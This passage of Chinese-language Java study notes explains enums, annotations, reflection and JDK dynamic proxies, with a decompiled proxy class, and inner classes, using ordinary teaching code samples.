Season WINTER = new Season(\"冬天\", \"白雪皑皑\");\n}\n```\n\n## 使用enum定义枚举类\n使用说明\n- 使用 enum 定义的枚举类默认继承了 java.lang.Enum类，因此不能再继承其他类\n- 枚举类的构造器只能使用 private 权限修饰符\n- 枚举类的所有实例必须在枚举类中显式列出,以`,`分隔`;`结尾。列出的实例系统会自动添加 public static final 修饰\n- 必须在枚举类的第一行声明枚举类对象\n- JDK 1.5 中可以在 switch 表达式中使用Enum定义的枚举类的对象作为表达式, case 子句可以直接使用枚举值的名字, 无需添加枚举类作为限定。\n```java\npublic enum SeasonEnum {\n    //枚举类实例\n    SPRING(\"春天\",\"春风又绿江南岸\"),\n    SUMMER(\"夏天\",\"映日荷花别样红\"),\n    AUTUMN(\"秋天\",\"秋水共长天一色\"),\n    WINTER(\"冬天\",\"窗含西岭千秋雪\");\n\n    private final String seasonName;\n    private final String seasonDesc;\n    private SeasonEnum(String seasonName, String seasonDesc) {\n        this.seasonName = seasonName;\n        this.seasonDesc = seasonDesc; \n    }\n    public String getSeasonName() {\n        return seasonName;\n    }\n    public String getSeasonDesc() {\n        return seasonDesc; \n    } \n}\n```\n\n**Enum类的主要方法**\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130539.png)\n- values()方法：返回枚举类型的对象数组。该方法可以很方便地遍历所有的枚举值。\n- valueOf(String str)：可以把一个字符串转为对应的枚举类对象。要求字符串必须是枚举类对象的“名字”。如不是，会有运行时异常：IllegalArgumentException。 \n- toString()：返回当前枚举类对象常量的名称\n\n**实现接口的枚举类**\n- 和普通 Java 类一样，枚举类可以实现一个或多个接口\n- 若每个枚举值在调用实现的接口方法呈现相同的行为方式，则只要统一实现该方法即可。\n- 若需要每个枚举值在调用实现的接口方法呈现出不同的行为方式, 则可以让每个枚举值分别来实现该方法\n\n情况一：在Enum类中实现抽象方法\n```java\ninterface Info{\n  void show();\n}\n\nenum SeasonEnum implements Info{\n  SPRING(\"spring\", \"jfkdfj\"),\n  SUMMER(\"summer\", \"hkfjdk\");\n\n  private final String seasonName;\n  private final String seasonDesc;\n\n  private SeasonEnum(String seasonName, String seasonDesc){\n    this.seasonName = seasonName;\n    this.seasonDesc = seasonDesc;\n  }\n  @Override\n  public void show(){\n    System.out.println(\"fjfj\");\n  }\n}\n```\n情况二：让枚举类的对象分别实现接口中的抽象方法\n```java\ninterface Info{\n  void show();\n}\n\nenum SeasonEnum implements Info{\n  SPRING(\"spring\", \"jfkdfj\"){\n    @Override\n    public void show(){\n      System.out.println(\"fjkdjf\");\n    }\n  },\n  SUMMER(\"summer\", \"hkfjdk\"){\n    @Override\n    public void show(){\n      System.out.println(\"fjfj\");\n    }\n  };\n  private final String seasonName;\n  private final String seasonDesc;\n  private SeasonEnum(String seasonName, String seasonDesc){\n    this.seasonName = seasonName;\n    this.seasonDesc = seasonDesc;\n  }\n}\n```\n\n# 注解\n<font color=\"red\">注解一定要配合反射使用才能起作用，否则注解没点作用</font>\n\n- 从 JDK 5.0 开始, Java 增加了对元数据(MetaData) 的支持, 也就是Annotation(注解) \n- Annotation 其实就是代码里的特殊标记, 这些标记可以在编译, 类加载, 运行时被读取, 并执行相应的处理。通过使用 Annotation, 程序员可以在不改变原有逻辑的情况下, 在源文件中嵌入一些补充信息。代码分析工具、开发工具和部署工具可以通过这些补充信息进行验证或者进行部署。\n- Annotation 可以像修饰符一样被使用, 可用于修饰包,类, 构造器, 方法, 成员变量, 参数, 局部变量的声明, 这些信息被保存在 Annotation 的 “name=value” 对中\n- 在JavaSE中，注解的使用目的比较简单，例如标记过时的功能，忽略警告等。在JavaEE/Android中注解占据了更重要的角色，例如用来配置应用程序的任何切面，代替JavaEE旧版中所遗留的繁冗代码和XML配置等。 \n- 未来的开发模式都是基于注解的，JPA是基于注解的，Spring2.5以上都是基于注解的，Hibernate3.x以后也是基于注解的，现在的Struts2有一部分也是基于注解的了，注解是一种趋势，一定程度上可以说：框架 = 注解 + 反射 + 设计模式。\n- 使用 Annotation 时要在其前面增加 @ 符号, 并把该 Annotation 当成一个修饰符使用。用于修饰它支持的程序元素\n\n示例一：生成文档相关的注解\n@author 标明开发该类模块的作者，多个作者之间使用,分割\n@version 标明该类模块的版本\n@see 参考转向，也就是相关主题\n@since 从哪个版本开始增加的\n@param 对方法中某参数的说明，如果没有参数就不能写\n@return 对方法返回值的说明，如果方法的返回值类型是void就不能写\n@exception 对方法可能抛出的异常进行说明 ，如果方法没有用throws显式抛出的异常就不能写\n其中\n@param @return 和 @exception 这三个标记都是只用于方法的。\n@param的格式要求：@param 形参名 形参类型 形参说明\n@return 的格式要求：@return 返回值类型 返回值说明\n@exception的格式要求：@exception 异常类型 异常说明\n@param和@exception可以并列多个\n\n```java\npackage com.annotation.javadoc;\n/**\n* @author shkstart\n* @version 1.0\n* @see Math.java\n*/\npublic class JavadocTest {\n  /**\n  * 程序的主方法，程序的入口\n  * @param args String[] 命令行参数\n  */\n  public static void main(String[] args) {\n  }\n  /**\n  * 求圆面积的方法\n  * @param radius double 半径值\n  * @return double 圆的面积\n  */\n  public static double getArea(double radius){\n    return Math.PI * radius * radius; \n  }\n}\n```\n\n## 自定义注解\n- 定义新的 Annotation 类型使用 @interface 关键字\n- 自定义注解自动继承了java.lang.annotation.Annotation接口\n- Annotation 的成员变量在 Annotation 定义中以无参数方法的形式来声明。其方法名和返回值定义了该成员的名字和类型。我们称为配置参数。类型只能是八种基本数据类型、String类型、Class类型、enum类型、Annotation类型、以上所有类型的数组。 \n- 可以在定义Annotation的成员变量时为其指定初始值, 指定成员变量的初始值可使用 default 关键字\n- 如果只有一个参数成员，建议使用参数名为value\n- 如果定义的注解含有配置参数，那么使用时**必须**指定参数值，除非它有默认值。格式是“参数名=参数值”. 如果仅给value属性赋值时，此时value属性可以省略，只写属性值。\n- 没有成员定义的Annotation称为标记，例如@Override注解。 包含成员变量的 Annotation 称为元数据 Annotation\n\n```java\n@MyAnnotation(value=\"尚硅谷\")\npublic class MyAnnotationTest {\n  public static void main(String[] args) {\n    Class clazz = MyAnnotationTest.class;\n    Annotation a = clazz.getAnnotation(MyAnnotation.class);\n    MyAnnotation m = (MyAnnotation) a;\n    String info = m.value();\n    System.out.println(info);\n  } \n}\n\n@Retention(RetentionPolicy.RUNTIME)\n@Target(ElementType.TYPE)\n@interface MyAnnotation{\n  String value() default \"auguigu\"; \n}\n```\n\n## 元注解\nJDK 的元注解用于修饰其他注解定义\nJDK5.0提供了4个标准的meta-annotation类型，分别是：\n- Retention\n- Target\n- Documented\n- Inherited\n\n**@Retention**\n@Retention: 只能用于修饰一个 Annotation 定义, 用于指定该Annotation的生命周期, @Rentention包含一个RetentionPolicy类型的成员变量, 使用@Rentention时必须为该 value 成员变量指定值: \n- RetentionPolicy.SOURCE:在源文件中有效（即源文件保留），编译器直接丢弃这种策略的注释\n- RetentionPolicy.CLASS:在class文件中有效（即class保留） ， 当运行Java程序时, JVM不会保留注解。 这是默认值\n- RetentionPolicy.RUNTIME:在运行时有效（即运行时保留），当运行 Java 程序时, JVM 会保留注释。程序可以通过反射获取该注释。\n\n**只有声明为RUNTIME的注解，才能通过反射获取**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130603.png)\n\n**@Targe**\n@Target: 用于修饰 Annotation 定义, 用于指定被修饰的 Annotation 能用于修饰哪些程序元素。 @Target 也包含一个名为 value 的成员变量\n| 取值(ElementType) |                                            |\n| ----------------- | ------------------------------------------ |\n| CONSTRUCTOR       | 用于描述构造器                             |\n| FIELD             | 用于描述域                                 |\n| LOCAL_VARIABLE    | 用于描述局部变量                           |\n| METHOD            | 用于描述方法                               |\n| PACKAGE           | 用于描述包                                 |\n| PARAMETER         | 用于描述参数                               |\n| TYPE              | 用于描述类、接口（包括注解类型）或enum声明 |\n\n**@Documented**\n@Documented: 用于指定被该元 Annotation 修饰的 Annotation 类将被javadoc 工具提取成文档。默认情况下，javadoc是不包括注解的。 \n定义为Documented的注解必须设置Retention值为RUNTIME。 \n\n**@Inherited**\n@Inherited: 被它修饰的 Annotation 将具有继承性。如果某个类使用了被@Inherited 修饰的 Annotation, 则其子类将自动具有该注解。\n比如：如果把标有@Inherited注解的自定义的注解标注在类级别上，子类则可以继承父类类级别的注解\n\n**利用反射获取注解信息**\n\n\n# 反射\nReflection（反射）是被视为动态语言的关键，反射机制允许程序在执行期借助于Reflection API取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。\n加载完类之后，在堆内存中就产生了一个Class类型的对象（一个类只有一个Class对象），**我们可以通过这个对象看到类的结构**。这个对象就像一面镜子，透过这个镜子看到类的结构，所以，我们形象的称之为：反射。\n\n正常方式：引入需要的“包类”名称 -》 通过new实例化 -》 取得实例化对象\n反射方式：实例化对象 -》 getClass()方法 -》 取得完整的“包类”名称\n\n>补充： 动态语言 vs 静态语言\n- 动态语言：是一类在运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。\n主要动态语言：Object-C、C#、JavaScript、PHP、Python、Erlang。\n- 静态语言：与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++。\nJava不是动态语言，但Java可以称之为“准动态语言”。即Java有一定的动态性，我们可以利用反射机制、字节码操作获得类似动态语言的特性。\nJava的动态性让编程的时候更加灵活！\n\n**java反射机制提供的功能**\n- 在运行时判断任意一个对象所属的类\n- 在运行时构造任意一个类的对象\n- 在运行时判断任意一个类所具有的成员变量和方法\n- 在运行时调用任意一个对象的成员变量和方法\n- 在运行时获取泛型信息\n- 在运行时处理注解\n- 生成动态代理\n\n**反射相关的主要API**\n- java.lang.Class：代表一个类\n- java.lang.reflect.Method：代表类的方法\n- java.lang.reflect.Field：代表类的成员变量\n- java.lang.reflect.Constructor：代表类的构造器\n\n## Class类的实例\n- Class类：我们平时在开发中定义的类是用来描述业务逻辑的；比如Teacher.java，Student.java等，而Class类用来描述我们所定义的业务逻辑的类，也就是描述类的类。\n- Class类的实例：其实就是JVM中的字节码对象，一个字节码文件有一个字节码对象，一个Class实例表示在JVM中的某个类或者接口，且一个加载的类在JVM中<font color=\"red\">只会</font>有一个Class实例。 类的实例化就是先通过这个类的Class类的实例，即字节码对象来创建的。所以每个类的实例都会记得自己是由哪个Class实例所生成的\n\n每一个类都有都有一个Class对象，也就是说每个类都有一个字节码对象，有一个字节码文件。当第一次使用类的时候，该类的字节码文件会被加载到JVM中，创建一个字节码对象；此时，该字节码对象就是一个Class实例。\n既然每一个类都有一个Class对象，那么这些Class对象之间是如何区分它所表示的是哪一个类的字节码的呢？为了解决这个问题，Java 为Class提供了泛型：`Class<T>`。\n- java.lang.String类的字节码类型：`Class<java.lang.String>`;\n- java.util.Date类的字节码类型：`Class<java.util.Date>`;\n- java.util.ArrayList类的字节码类型：`Class<java.util.ArrayList>`;\n\n**Class类的常用方法**\n| 方法名                                           | 功能说明                                                            |\n| ------------------------------------------------ | ------------------------------------------------------------------- |\n| static Class forName(String name)                | 返回指定类名 name 的 Class 对象                                     |\n| Object newInstance()                             | 调用缺省构造函数，返回该Class对象的一个实例                         |\n| getName()                                        | 返回此Class对象所表示的实体（类、接口、数组类、基本类型或void）名称 |\n| Class getSuperClass()                            | 返回当前Class对象的父类的Class对象                                  |\n| Class [] getInterfaces()                         | 获取当前Class对象的接口                                             |\n| ClassLoader getClassLoader()                     | 返回该类的类加载器                                                  |\n| Class getSuperclass()                            | 返回表示此Class所表示的实体的超类的Class                            |\n| Constructor[] getConstructors()                  | 返回一个包含某些Constructor对象的数组                               |\n| Field[] getDeclaredFields()                      | 返回Field对象的一个数组                                             |\n| Method getMethod(String name,Class … paramTypes) | 返回一个Method对象，此对象的形参类型为paramType                     |\n\n**获取Class实例/字节码对象的方法**\n```java\n//方式一：类名.class\nClass<Person> clazz1 = Person.class;\nClass clazz2 = Person.class;\n\n//方式二：通过调用字节码对象的实例的getClass()方法\nPerson p1 = new Person();\nClass clazz2 = p1.getClass();\n\n//方式三：调用Class类的静态方法forName(String classPath)\nClass clazz3 = Class.forName(\"com.atguigu.java.Person\");\n\n//方式四：使用类加载器ClassLoader\nClassLoader classLoader = ReflectionTest.class.getClassLoader();\nClass clazz4 = classLoader.loadClass(\"com.atguigu.java.Person\");\n```\n\n**哪些类型可以有Class对象？**\n- class： 外部类，成员(成员内部类，静态内部类)，局部内部类，匿名内部类\n- interface：接口\n- []：数组\n- enum：枚举\n- annotation：注解@interface\n- primitive type：基本数据类型\n- void\n\n```java\nClass c1 = Object.class;\nClass c2 = Comparable.class;\nClass c3 = String[].class;\nClass c4 = int[][].class;\nClass c5 = ElementType.class;\nClass c6 = Override.class;\nClass c7 = int.class;\nClass c8 = void.class;\nClass c9 = Class.class;\nint[] a = new int[10];\nint[] b = new int[100];\nClass c10 = a.getClass();\nClass c11 = b.getClass();\n// 只要元素类型与维度一样，就是同一个Class\nSystem.out.println(c10 == c11);\n```\n\n## 获取字节码对象的完整结构\n- 实现的全部接口\npublic Class<?>[] getInterfaces() \n确定此对象所表示的类或接口实现的接口。\n\n- 所继承的父类\npublic Class<? Super T> getSuperclass()\n返回表示此 Class 所表示的实体（类、接口、基本类型）的父类的Class。\n\n- 全部的构造器\npublic Constructor\\<T>[] getConstructors()\n返回此 Class 对象所表示的类的所有public构造方法。\npublic Constructor\\<T>[] getDeclaredConstructors()\n返回此 Class 对象表示的类声明的所有构造方法。\npublic Constructor\\<T> getConstructor(Class<?>... parameterTypes)\n返回此 Class 对象表示的类声明的指定的构造方法。\n  - Constructor类中：\n    取得修饰符: public int getModifiers();\n    取得方法名称: public String getName();\n    取得参数的类型：public Class<?>[] getParameterTypes();\n    实例化对象：T newInstance(Object... initargs)\n```java\n//1.根据全类名获取对应的Class对象\nString name = \"atguigu.java.Person\";\nClass clazz = Class.forName(name);\n//2.调用指定参数结构的构造器，生成Constructor的实例\nConstructor con = clazz.getConstructor(String.class,Integer.class);\n//3.通过Constructor的实例创建对应类的对象，并初始化类属性\nPerson p2 = (Person) con.newInstance(\"Peter\",20);\nSystem.out.println(p2);\n```\n\n- 全部的方法\npublic Method[] getDeclaredMethods()\n返回此Class对象所表示的类或接口的全部方法\npublic Method[] getMethods() \n返回此Class对象所表示的类或接口的public的方法\n  - Method类中：\n    public Class<?> getReturnType()取得全部的返回值\n    public Class<?>[] getParameterTypes()取得全部的参数\n    public int getModifiers()取得修饰符\n    public Class<?>[] getExceptionTypes()取得异常信息\n\n- 全部的Field\npublic Field[] getFields() \n返回此Class对象所表示的类或接口的public的Field。 \npublic Field[] getDeclaredFields() \n返回此Class对象所表示的类或接口的全部Field。 \n  - Field方法中：\n    public int getModifiers() 以整数形式返回此Field的修饰符\n    public Class<?> getType() 得到Field的属性类型\n    public String getName() 返回Field的名称。\n    public void set(Object obj, Object value) 设置当前属性值\n    public Object get(Object obj) 获取当前属性值\n\n- Annotation相关\nAnnotation[]\tgetAnnotations() 获取所有注解，包括父类\nAnnotation[] getDeclaredAnnotations()  获取直接声明在类上面的所有注解\n`<A extends Annotation>` A\tgetDeclaredAnnotation(`Class<A>` annotationClass) 获取直接声明在类上面的指定类型的注解\nT getAnnotation(`Class\\<T>` annotationClass) 获取指定类型的注解\nboolean\tisAnnotationPresent(Class<? extends Annotation> annotationClass) 如果此元素上存在指定类型的注释，则返回 true，否则返回 false。\n\n- 泛型相关\n获取父类泛型类型：Type getGenericSuperclass()\n泛型类型：ParameterizedType\n获取实际的泛型类型参数数组：getActualTypeArguments()\n\n\n- 类所在的包\nPackage getPackage()\n\n## 调用运行时类的指定结构\n### 调用指定方法\n通过反射，调用类中的方法，通过Method类完成。步骤：\n1. 通过Class类的getMethod(String name,Class…parameterTypes)方法取得一个Method对象，并设置此方法操作时所需要的参数类型。参数说明：\n  - name: method的名称\n  - parameterTypes：method的参数类型的列表（参数顺序需按声明method时的参数列表排列）\n2. 之后使用Object invoke(Object obj, Object[] args)进行调用，并向方法中传递要设置的obj对象的参数信息,说明：\n  - Object: 对应原方法的返回值，若原方法无返回值，此时返回null\n  - obj: 从中调用底层方法的对象（简单的说就是调用谁的方法用谁的对象), 若原方法若为静态方法，此时形参Object obj可为null\n  - args: 用于方法调用的参数, 若原方法形参列表为空，则Object[] args为null\n\n注意：若原方法声明为private, 则需要在调用此invoke()方法前，显式调用方法对象的setAccessible(true)方法，将可访问private的方法。\n\n例子：\n```java\nimport java.lang.reflect.Method;\npublic class Main {\n  public static void main(String[] args) throws Exception{\n    String[] names = { \"tom\", \"tim\", \"allen\", \"alice\" };\n    Class<?> clazz = Test.class;\n\n    Method method  = clazz.getMethod(\"sayHi\", String.class);\n    for (String name : names) {\n      method.invoke(clazz.newInstance(), name);\n    }\n  }\n}\n\nclass Test {\n  public void sayHi(String name) {\n    System.out.println(\"Hi\" + name);\n  }\n}\n```\n输出：\n```txt\nHitom\nHitim\nHiallen\nHialice\n```\n\n### 调用指定属性\n在反射机制中，可以直接通过Field类操作类中的属性，通过Field类提供的set()和get()方法就可以完成设置和取得属性内容的操作。\n- public Field getField(String name) 返回此Class对象表示的类或接口的指定的public的Field。 \n- public Field getDeclaredField(String name)返回此Class对象表示的类或接口的指定的Field。 \n\n在Field中：\n- public Object get(Object obj) 取得指定对象obj上此Field的属性内容\n- public void set(Object obj,Object value) 设置指定对象obj上此Field的属性内容\n\n#### 妙用\n当一个类中的成员变量设置成私有的，且没有提供set方法时，如果你向改变该成员变量的值，则你可以使用Field类。如下：\n```java\npublic class Test {\n  private String name = \"whz\";\n\n  public void print() {\n    System.out.println(name);\n  }\n}\n```\n```java\npublic class main {\n  public static void main(String[] args) {\n    Test test = new Test();\n    try {\n      Field field = test.getClass().getDeclaredField(\"name\");\n      field.setAccessible(true);\n      field.set(test, \"hahaha\");\n    } catch (Exception e) {\n      e.printStackTrace();\n    }\n    test.print(); // 输出hahaha\n  }\n}\n```\n\n### 关于setAccessible方法的使用\n- Method和Field、Constructor对象都有setAccessible()方法。\n- setAccessible启动和禁用访问安全检查的开关。 \n- 参数值为true则指示反射的对象在使用时应该取消Java语言访问检查。 提高反射的效率。如果代码中必须用反射，而该句代码需要频繁的被调用，那么请设置为true。 使得原本无法访问的私有成员也可以访问\n- 参数值为false则指示反射的对象应该实施Java语言访问检查\n\n```java\nClass clazz = Person.class;   \nField name = clazz.getDeclaredField(\"name\"); \nname.setAccessible(true);\nPerson p = (Person)clazz.newInstance();\nname.set(p, \"whz\");\nSystem.out.println(name.get(p));\n```\n\n### InvocationHandler接口\nInvocationHandler接口是由代理对象的调用处理程序实现的接口，每个代理对象都有一个关联的调用处理程序，当在代理实例上调用方法时，方法调用将被编码并分派到其调用处理程序的Invoke方法, 该接口就只有一个方法`Object invoke(Ojbect proxy, Method method, Object[] args)`，\n参数：\n- proxy: 调用该方法的代理对象\n- method: 所述方法对应于调用代理实例上的接口方法的实例。\n- args：包含的方法调用传递代理对象的参数值的对象，或null。\n\n# java实现代理\n有关代理的知识可以见`设计模式.md`笔记\n\n## jdk动态代理\n所谓的jdk动态代理就是使用使用jdk反射包(java.lang.reflect)中的类和接口来实现动态代理的功能。主要是使用反射包中的三个类：InvocationHandler、Method、Proxy\n\n我们来比较Java的class和interface的区别：\n- 可以实例化class（非abstract）；\n- 不能实例化interface。\n所有interface类型的变量总是通过某个实例向上转型并赋值给接口类型变量的：\n```java\nCharSequence cs = new StringBuilder();\n```\n有没有可能不编写实现类，直接在运行期创建某个interface的实例呢？\n\n这是可能的，因为Java标准库提供了一种动态代理（Dynamic Proxy）的机制：可以在运行期动态创建某个interface的实例。\n\n什么叫运行期动态创建？听起来好像很复杂。所谓动态代理，是和静态相对应的。我们来看静态代码怎么写：\n\n定义接口：\n```java\npublic interface Hello {\n    void morning(String name);\n}\n```\n编写实现类：\n```java\npublic class HelloWorld implements Hello {\n    public void morning(String name) {\n        System.out.println(\"Good morning, \" + name);\n    }\n}\n```\n创建实例，转型为接口并调用：\n```java\nHello hello = new HelloWorld();\nhello.morning(\"Bob\");\n```\n\n这种方式就是我们通常编写代码的方式。\n\n还有一种方式是动态代码，我们仍然先定义了接口Hello，但是我们并不去编写实现类，而是直接通过JDK提供的一个`Proxy.newProxyInstance()`创建了一个Hello接口对象。这种没有实现类但是在运行期动态创建了一个接口对象的方式，我们称为动态代码。JDK提供的动态创建接口对象的方式，就叫动态代理。\n\n### 案例1\n\n一个最简单的动态代理实现如下：\n```java\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\n\npublic class Main {\n    public static void main(String[] args) {\n        InvocationHandler handler = new InvocationHandler() {\n            @Override\n            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                System.out.println(method);\n                if (method.getName().equals(\"morning\")) {\n                    System.out.println(\"Good morning, \" + args[0]);\n                }\n                return null;\n            }\n        };\n        Hello hello = (Hello) Proxy.newProxyInstance(\n            Hello.class.getClassLoader(), // 传入ClassLoader\n            new Class[] { Hello.class }, // 传入要实现的接口, 这里只能传入被代理的接口的class或者是被代理的类所实现的接口的class\n            handler); // 传入处理调用方法的InvocationHandler\n        hello.morning(\"Bob\");\n    }\n}\n\ninterface Hello {\n    void morning(String name);\n}\n```\n\n在运行期动态创建一个interface实例的方法如下：\n1. 定义一个InvocationHandler实例，它负责实现接口的方法调用；\n2. 通过Proxy.newProxyInstance()创建interface实例，它需要3个参数：\n  1. 使用的ClassLoader，通常就是接口类的ClassLoader；\n  2. 需要实现的接口数组，至少需要传入一个接口的class进去；**这里的接口可以是被代理的接口或者是被代理的类所实现的接口**\n  3. 用来处理接口方法调用的InvocationHandler实例。\n3. 将返回的Object强制转型为接口。\n\n动态代理实际上是JVM在运行期动态创建class字节码并加载的过程，它并没有什么黑魔法，把上面的动态代理改写为静态实现类大概长这样：\n```java\npublic class HelloDynamicProxy implements Hello {\n    InvocationHandler handler;\n    public HelloDynamicProxy(InvocationHandler handler) {\n        this.handler = handler;\n    }\n    public void morning(String name) {\n        handler.invoke(\n           this,\n           Hello.class.getMethod(\"morning\", String.class),\n           new Object[] { name });\n    }\n}\n```\n其实就是JVM帮我们自动编写了一个上述类（不需要源码，可以直接生成字节码），并不存在可以直接实例化接口的黑魔法。\n\n**小结:**\n- Java标准库提供了动态代理功能，允许在运行期动态创建一个接口的实例；\n- 动态代理是通过Proxy创建代理对象，然后将接口方法“代理”给InvocationHandler完成的。\n\n### 案例2\n\n> 参考: https://www.cnblogs.com/gonjan-blog/p/6685611.html\n\n首先是定义一个Person接口:\n```java\n/**\n * 创建Person接口\n */\npublic interface Person {\n    //上交班费\n    void giveMoney();\n}\n```\n\n创建需要被代理的实际类：\n```java\npublic class Student implements Person {\n    private String name;\n    public Student(String name) {\n        this.name = name;\n    }\n    \n    @Override\n    public void giveMoney() {\n       System.out.println(name + \"上交班费50元\");\n    }\n}\n```\n创建StuInvocationHandler类，实现InvocationHandler接口，**这个类中持有一个被代理对象的实例target**。InvocationHandler中有一个invoke方法，所有执行代理对象的方法都会被替换成执行invoke方法。\n\n再在invoke方法中执行被代理对象target的相应方法。当然，在代理过程中，我们在真正执行被代理对象的方法前加入自己其他处理。这也是Spring中的AOP实现的主要原理，这里还涉及到一个很重要的关于java反射方面的基础知识。\n\n```java\npublic class StuInvocationHandler<T> implements InvocationHandler {\n\n    //invocationHandler持有的被代理对象\n    T target;\n    \n    public StuInvocationHandler(T target) {\n       this.target = target;\n    }\n    \n    /**\n     * proxy:代表动态代理对象\n     * method：代表正在执行的方法\n     * args：代表调用目标方法时传入的实参\n     */\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        System.out.println(\"before: 代理执行\" +method.getName() + \"方法\");\n        Object result = method.invoke(target, args);\n        System.out.println(\"after: 代理执行\" +method.getName() + \"方法\");\n        return result;\n    }\n}\n```\n\n做完上面的工作后，我们就可以具体来创建动态代理对象了，上面简单介绍了如何创建动态代理对象，我们使用简化的方式创建动态代理对象：\n\n```java\npublic class ProxyTest {\n    public static void main(String[] args) {\n        \n        //创建一个实例对象，这个对象是被代理的对象\n        Person zhangsan = new Student(\"张三\");\n        \n        //创建一个与代理对象相关联的InvocationHandler\n        InvocationHandler stuHandler = new StuInvocationHandler<Person>(zhangsan);\n        \n        //创建一个代理对象stuProxy来代理zhangsan，代理对象的每个执行方法都会替换执行Invocation中的invoke方法\n        Person stuProxy = (Person) Proxy.newProxyInstance(Person.class.getClassLoader(), new Class<?>[]{Person.class}, stuHandler)；\n\n       //代理执行上交班费的方法\n        stuProxy.giveMoney();\n    }\n}\n```\n\n我们执行这个ProxyTest类，先想一下，我们创建了一个需要被代理的学生张三，将zhangsan对象传给了stuHandler中，我们在创建代理对象stuProxy时，将stuHandler作为参数了的，上面也有说到所有执行代理对象的方法都会被替换成执行invoke方法，也就是说，最后执行的是StuInvocationHandler中的invoke方法。所以在看到下面的运行结果也就理所当然了。\n\n运行结果：\n```txt\nbefore: 代理执行giveMoney方法\n张三上交班费50元\nafter: 代理执行giveMoney方法\n```\n\n#### 原理分析\n对这个class文件进行反编译，我们看看jdk为我们生成了什么样的内容：\n\n```java\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\nimport java.lang.reflect.UndeclaredThrowableException;\nimport proxy.Person;\n\npublic final class $Proxy0 extends Proxy implements Person\n{\n  private static Method m1;\n  private static Method m2;\n  private static Method m3;\n  private static Method m0;\n  \n  /**\n  *注意这里是生成代理类的构造方法，方法参数为InvocationHandler类型，看到这，是不是就有点明白\n  *为何代理对象调用方法都是执行InvocationHandler中的invoke方法，而InvocationHandler又持有一个\n  *被代理对象的实例，不禁会想难道是....？ 没错，就是你想的那样。\n  *\n  *super(paramInvocationHandler)，是调用父类Proxy的构造方法。\n  *父类持有：protected InvocationHandler h;\n  *Proxy构造方法：\n  *    protected Proxy(InvocationHandler h) {\n  *         Objects.requireNonNull(h);\n  *         this.h = h;\n  *     }\n  *\n  */\n  public $Proxy0(InvocationHandler paramInvocationHandler)\n    throws \n  {\n    super(paramInvocationHandler);\n  }\n  \n  //这个静态块本来是在最后的，我把它拿到前面来，方便描述\n   static\n  {\n    try\n    {\n      //看看这儿静态块儿里面有什么，是不是找到了giveMoney方法。请记住giveMoney通过反射得到的名字m3，其他的先不管\n      m1 = Class.forName(\"java.lang.Object\").getMethod(\"equals\", new Class[] { Class.forName(\"java.lang.Object\") });\n      m2 = Class.forName(\"java.lang.Object\").getMethod(\"toString\", new Class[0]);\n      m3 = Class.forName(\"proxy.Person\").getMethod(\"giveMoney\", new Class[0]);\n      m0 = Class.forName(\"java.lang.Object\").getMethod(\"hashCode\", new Class[0]);\n      return;\n    }\n    catch (NoSuchMethodException localNoSuchMethodException)\n    {\n      throw new NoSuchMethodError(localNoSuchMethodException.getMessage());\n    }\n    catch (ClassNotFoundException localClassNotFoundException)\n    {\n      throw new NoClassDefFoundError(localClassNotFoundException.getMessage());\n    }\n  }\n \n  /**\n  * \n  *这里调用代理对象的giveMoney方法，直接就调用了InvocationHandler中的invoke方法，并把m3传了进去。\n  *this.h.invoke(this, m3, null);这里简单，明了。\n  *来，再想想，代理对象持有一个InvocationHandler对象，InvocationHandler对象持有一个被代理的对象，\n  *再联系到InvacationHandler中的invoke方法。嗯，就是这样。\n  */\n  public final void giveMoney()\n    throws \n  {\n    try\n    {\n      this.h.invoke(this, m3, null);\n      return;\n    }\n    catch (Error|RuntimeException localError)\n    {\n      throw localError;\n    }\n    catch (Throwable localThrowable)\n    {\n      throw new UndeclaredThrowableException(localThrowable);\n    }\n  }\n\n  //注意，这里为了节省篇幅，省去了toString，hashCode、equals方法的内容。原理和giveMoney方法一毛一样。\n\n}\n```\n\n#### 总结\njdk动态代理能代理接口或者实现了接口的类，但是不能代理没有实现接口的类。对于没有实现接口的类可以用cglib代理\n\n# 嵌套类\n内部类分为成员内部类、静态嵌套类、方法内部类、匿名内部类。\n\n几种内部类的共性：\n- 内部类仍然是一个独立的类，在编译之后会内部类会被编译成独立的.class文件，但是前面冠以外部类的类命和$符号。\n- 内部类不能用普通的方式访问。内部类是外部类的一个成员，因此内部类可以自由地访问外部类的成员变量，无论是否是private的。\n\n## 成员内部类\n- 成员内部类可以访问外部类的所有成员，外部类要访问成员内部类的成员时，必须要先创建一个成员内部类，再通过指向这个对象的引用来访问\n- 当成员内部类拥有和外部类同名的成员变量或者方法时，默认情况下访问的是成员内部类的成员\n- 如果要访问外部类的同名成员，需要按照`外部类.this.成员变量（方法）`形式来访问\n- 成员内部类是依附外部类而存在的，如果要创建成员内部类的对象，前提是必须存在一个外部类的对象\n- 创建成员内部类对象一般有如下2种方式：\n  - Outer.Inner in1 = new Outer().new Inner()\n  - Outer.Inner in2 = new Outer().getInnerInstance();\n\n## 静态内部类\n- 静态内部类可以在不创建外部类对象的情况下被实例化。创建静态内部类对象的语法格式：`Outer.Inner in = new Outer.Inner()`\n- 静态内部类只能访问外部类的静态成员\n- 静态内部类中能定义静态成员，而非静态内部类中不能定义静态成员\n\n## 方法内部类\n- 方法内部类为在成员方法中定义的类，只能在当前方法中被使用\n- 方法内部类对象不能使用该内部类所在方法中的非final局部变量\n\n## 匿名内部类\n- 匿名内部类必须要继承一个父类或者实现一个接口，没有class关键字，直接使用new来生成一个隐式的对象引用。\n- 只有一个实例\n\n### 继承式的匿名内部类\n```java\nclass Car {\n  public void drive(){\n      System.out.println(\"Driving a car!\");\n  }\n}\n  \nclass Test{\n  public static void main(String[] args) {\n      Car car = new Car(){\n          public void drive(){\n              System.out.println(\"Driving another car!\");\n          }\n      };\n      car.drive();\n  }\n}\n```\n结果输出了：Driving another car! \n\nCar引用变量不是引用Car对象，而是Car匿名子类的对象。\n\n### 